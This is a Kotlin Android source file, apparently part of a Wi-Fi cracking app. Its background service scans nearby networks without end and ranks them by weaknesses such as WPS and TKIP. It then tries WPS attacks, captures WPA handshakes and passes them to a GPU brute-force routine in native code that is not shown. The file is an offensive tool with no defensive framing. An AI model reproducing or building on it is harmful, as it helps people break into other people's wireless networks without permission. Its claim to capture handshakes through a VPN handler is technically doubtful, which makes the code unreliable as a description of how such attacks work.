package com.wifihack

import android.app.Service
import android.content.Context
import android.content.Intent
import android.net.wifi.ScanResult
import android.net.wifi.WifiManager
import java.util.PriorityQueue

class ScannerService : Service() {
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val wm = getSystemService(Context.WIFI_SERVICE) as WifiManager
        val vpn = VpnHandler()
        vpn.establish()
        scanLoop(wm, vpn)
        return START_STICKY
    }

    override fun onBind(intent: Intent?) = null

    private fun scanLoop(wm: WifiManager, vpn: VpnHandler) {
        while (true) {
            wm.startScan()
            val results = wm.scanResults
            val queue = PriorityQueue<ScanResult>(compareByDescending { score(it) })
            results.forEach { queue.add(it) }
            while (queue.isNotEmpty()) {
                val ap = queue.poll()
                if (wpsTry(ap)) continue
                val pcap = vpn.captureHandshake(ap.BSSID)
                if (pcap != null) gpuBrute(pcap)
            }
            Thread.sleep(20000)
        }
    }

    private fun score(r: ScanResult): Int {
        var s = 0
        if (r.capabilities.contains("WPS")) s += 30
        if (r.capabilities.contains("TKIP")) s += 15
        if (r.level > -45) s += 10
        return s
    }

    private fun wpsTry(ap: ScanResult): Boolean =
        NativeLib.runWps(ap.BSSID)

    private fun gpuBrute(pcap: ByteArray) =
        NativeLib.runHash(pcap, pcap.size)
}
